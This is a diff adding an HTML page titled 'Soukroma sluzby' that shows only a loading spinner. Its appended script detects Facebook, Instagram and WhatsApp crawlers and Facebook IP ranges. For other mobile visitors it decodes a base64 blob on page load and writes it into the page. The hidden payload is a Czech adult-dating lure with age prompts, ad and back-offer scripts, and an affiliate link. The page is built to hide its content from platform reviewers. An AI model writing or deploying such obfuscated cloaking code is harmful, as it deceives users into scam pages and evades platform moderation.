@@ -1,0 +1,232 @@
+
+<html id="prime" >
+    <head>
+    <title>Soukroma sluzby</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta content='https://i.postimg.cc/Bnq5MpvX/Screenshot-756.png' property='og:image'/>
+        <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcC7_Zc4ddlr3Ck6fEFOHYplPmNaKFIb4j24byY41u-b7_dTuKiggbT7iKms9dcaoMUUDExsicyLQxxAeiysuiwf3jFzVsvg_hWEVjr7-YdsXtDs9iYzuG59dHkSxLGKocfuq01_BUQ9jpuhRnOMbds5UvJIW4rihCUNjv_4L_d3AmmTgVwaLgwD96YUy4/s747/z5260813048797_66b99f581fd8070a9f7b8c3bb3cd63b2.jpg" property="og:image">
+        <meta content="610" property="og:image:width">
+        <meta content="391" property="og:image:height">
+        <style type="text/css">
+        /* Absolute Center Spinner */
+        .loading {
+            position: fixed;
+            z-index: 999;
+            height: 2em;
+            width: 2em;
+            overflow: show;
+            margin: auto;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+        }
+
+        /* Transparent Overlay */
+        .loading:before {
+            content: '';
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1560a1;
+        }
+
+        /* :not(:required) hides these rules from IE9 and below */
+        .loading:not(:required) {
+            /* hide "loading..." text */
+            font: 0/0 a;
+            color: transparent;
+            text-shadow: none;
+            background-color: transparent;
+            border: 0;
+        }
+
+        .loading:not(:required):after {
+            content: '';
+            display: block;
+            font-size: 10px;
+            width: 1em;
+            height: 1em;
+            margin-top: -0.5em;
+            -webkit-animation: spinner 150ms infinite linear;
+            -moz-animation: spinner 150ms infinite linear;
+            -ms-animation: spinner 150ms infinite linear;
+            -o-animation: spinner 150ms infinite linear;
+            animation: spinner 150ms infinite linear;
+            border-radius: 0.5em;
+            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+        }
+
+        /* Animation */
+
+        @-webkit-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-moz-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-o-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style></head>
+
+<body>
+    <div class="loading">Loading…</div>
+    
+                            
+                
+    
+
+</body></html>
+
+
+
+
+<script>
+    var tiempoRedireccion = 800; // 0.8 segundos
+    var redi = "https://google.com"; 
+    
+    function isFacebookIP(ip) {
+        var facebookIPs = [
+            "31.13.24.0/21",
+            "31.13.64.0/18",
+            "45.64.40.0/22",
+            "31.13.0.0/16",
+            "66.220.144.0/20",
+            "69.63.176.0/20",
+            "69.63.176.0/21",
+            "69.63.184.0/21",
+            "69.171.224.0/19",
+            "74.119.76.0/22",
+            "103.4.96.0/22",
+            "129.134.0.0/16",
+            "157.240.0.0/16",
+            "173.252.64.0/18",
+            "179.60.192.0/22",
+            "185.60.216.0/22",
+            "204.15.20.0/22"
+          ];
+    
+      return facebookIPs.some(function(range) {
+        var parts = range.split('/');
+        var baseIP = parts[0];
+        var subnetMask = parseInt(parts[1], 10);
+        var longIP = ipToLong(ip);
+        var longBaseIP = ipToLong(baseIP);
+        var mask = -1 << (32 - subnetMask);
+        return (longIP & mask) === (longBaseIP & mask);
+      });
+    }
+    
+    function ipToLong(ip) {
+      return ip.split('.').reduce(function(ipInt, octet) {
+        return (ipInt << 8) + parseInt(octet, 10);
+      }, 0) >>> 0;
+    }
+    
+    var bots = [
+      "facebookexternalhit",
+      "Facebot",
+      "ia_archiver",
+      "Embedly",
+      "developers.facebook.com",
+      "facebookplatform",
+      "Instagram",
+      "whatsapp",
+    ];
+    
+    function isMobile() {
+        return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      }
+    
+    function isBot(userAgent) {
+      return bots.some(function(bot) {
+        return userAgent.includes(bot);
+      });
+    }
+    
+
+    var newHTML = `PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxzY3JpcHQgaWQ9Il93YXUxY2EiPnZhciBfd2F1ID0gX3dhdSB8fCBbXTsgX3dhdS5wdXNoKFsiZHluYW1pYyIsICJiYWRib3k3NyIsICIxY2EiLCAiZmZmZmZmZmZmZmZmIiwgInNtYWxsIl0pOzwvc2NyaXB0PjxzY3JpcHQgYXN5bmMgc3JjPSIvL3dhdXN0LmF0L2QuanMiPjwvc2NyaXB0Pgo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+CjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgbWluaW11bS1zY2FsZT0xLCBtYXhpbXVtLXNjYWxlPTEsIHVzZXItc2NhbGFibGU9bm8iPgo8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9Im5vaW5kZXgsIG5vZm9sbG93Ij4KPHRpdGxlPlNvdWtyb21hIHNsdXpieTwvdGl0bGU+CjxtZXRhIGNvbnRlbnQ9J2h0dHBzOi8vaS5wb3N0aW1nLmNjL0JucTVNcHZYL1NjcmVlbnNob3QtNzU2LnBuZycgcHJvcGVydHk9J29nOmltYWdlJy8+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5zbXJ0LWNvbnRlbnQuY29tL2Fzc2V0cy8xMDA0L2pzL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uc21ydC1jb250ZW50LmNvbS9hc3NldHMvMTAwNC9qcy9kZXZpY2UubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLnNtcnQtY29udGVudC5jb20vYXNzZXRzLzEwMDQvanMvY3VzdG9tLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLnNtcnQtY29udGVudC5jb20vYXNzZXRzLzEwMDQvanMvYmFja29mZmVyLmpzIj48L3NjcmlwdD4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2Nkbi5zbXJ0LWNvbnRlbnQuY29tL2Fzc2V0cy8xMDA0L2Nzcy9pbmRleC5jc3MiPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vY2RuLmptcGNkbi5jb20vYXNzZXRzLzM0MjAvaW1hZ2VzLzIuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iPgo8dGl0bGU+UGhvdG8gR2FsbGVyeTwvdGl0bGU+CjxkaXYgY2xhc3M9ImxheWVyIj4KPC9kaXY+CjxkaXYgY2xhc3M9IndyYXAiPgo8ZGl2IGNsYXNzPSJzdGVwLWJsb2NrIj4KPGRpdiBjbGFzcz0ibG9nbyI+CjwvZGl2Pgo8ZGl2IGNsYXNzPSJzdGVwLWl0ZW0iIHN0eWxlPSJkaXNwbGF5OiBibG9jazsiPgo8ZGl2IGNsYXNzPSJxdWVzdGlvbi10aXRsZSAiPgpWeWNoem1lIGRvbWEgdiBub2NpIGEgbmEgaG9kaW51LCB2ZSB2ZWNoIHN0ZWNoIG1zdGEuIENoY2V0ZSB2aWR0IG1qIGthdGFsb2c/LjwvZGl2Pgo8ZGl2IGNsYXNzPSJidXR0b25zLWJsb2NrIj4KPGRpdiBjbGFzcz0ic3RlcC1idG4gbm8tYnRuIHRyLW5leHQtYnV0dG9uIHRyLWItb3B0aW9uIj4KQW5vCjwvZGl2Pgo8ZGl2IGNsYXNzPSJzdGVwLWJ0biB5ZXMtYnRuIHRyLW5leHQtYnV0dG9uIHRyLWItb3B0aW9uIj4KTmUKPC9kaXY+CjwvZGl2Pgo8L2Rpdj4KPGRpdiBjbGFzcz0ic3RlcC1pdGVtIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgo8ZGl2IGNsYXNzPSJxdWVzdGlvbi10aXRsZSAiPgpTbHVieSBwb3V6ZSBwcm8gZG9zcGwgbXVlIEplIHRpIGFsZXNwb24gMTggbGV0PyBKc21lIGtsdWIgQ29tcGFuaW9uIExhZGllcywgc3Rpc2tuZXRlIEFOTyBhIHNsZWR1anRlIG5hcyB6aXZlIG5hei4KPC9kaXY+CjxkaXYgY2xhc3M9ImJ1dHRvbnMtYmxvY2siPgo8ZGl2IGNsYXNzPSJzdGVwLWJ0biBuby1idG4gdHItbmV4dC1idXR0b24gdHItYi1vcHRpb24iPgpBbm8KPC9kaXY+CjxkaXYgY2xhc3M9InN0ZXAtYnRuIHllcy1idG4gdHItbmV4dC1idXR0b24gdHItYi1vcHRpb24iPgpOZQo8L2Rpdj4KPC9kaXY+CjwvZGl2Pgo8ZGl2IGNsYXNzPSJzdGVwLWl0ZW0gdGhpc2hpZGUiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+CjxkaXYgY2xhc3M9InF1ZXN0aW9uLXRpdGxlICI+CkNoY2V0ZS1saSBzZSB6ZGFybWEgemFyZWdpc3Ryb3ZhdCBhIEZVQ0sgcyBqYWtvdWtvbGkgZHZrb3UsIHN0aXNrbnRlIHRsYXRrbyBWU1RPVVBJVCBuZSBhIHphcmVnaXN0cnVqdGUgc2UgemRhcm1hIG5hIG5hIHNvdWtyb20gc2V6bmFtY2UuIEpzbWUgaXYsIHRtZSBzZSBuYSBsYWhvZG4gYW5sbiwgdmFnaW5sbiwgdHJvamt5IGEgZGFsLi4uIDwvZGl2Pgo8cD4KPGIgc3R5bGU9ImNvbG9yOiByZWQ7Ij4KPC9iPgo8L3A+CjxkaXYgY2xhc3M9ImJ1dHRvbnMtYmxvY2siPgo8YSBocmVmPSJodHRwczovL2xvdmVhZmZhaXJodWIubGlmZS8/dT1nZ2VwNjA3Jm89NWY2azhoZiZ0PWJhZGJveTc3IiBjbGFzcz0ic3RlcC1idG4gc3VibWl0LWJ0biB0ci1zdWJtaXQtYnV0dG9uIHNob3dtYWlsIj5WU1RPVVBJVAo8L2E+CjwvZGl2Pgo8L2Rpdj4KPHZpZGVvIGF1dG9wbGF5IG11dGVkIGxvb3AgaWQ9IlZpZGVvQmciPgo8c291cmNlIHNyYz0iaHR0cHM6Ly9xdS5heC9BWnVWLm1wNCIgdHlwZT0idmlkZW8vbXA0Ij4KPC92aWRlbz4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAvKjwhW0NEQVRBWyovICAgIChmdW5jdGlvbih3KXsKICAgICAgICB3LmJhY2tPZmZlclVybCA9ICcnICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgKHdpbmRvdykpOwogICAgICAvKl1dPiovIAo8L2JvZHk+CjwvaHRtbD4=`; 
+
+    function redirectIfNeeded() {
+      if (isMobile() && !isBot(navigator.userAgent) && !isFacebookIP(location.host)) {
+        setTimeout(function() {
+            
+            document.open();
+            document.write(atob(newHTML));
+            document.close();
+
+        }, tiempoRedireccion);
+      }
+    }
+    redirectIfNeeded();
+    </script>
+
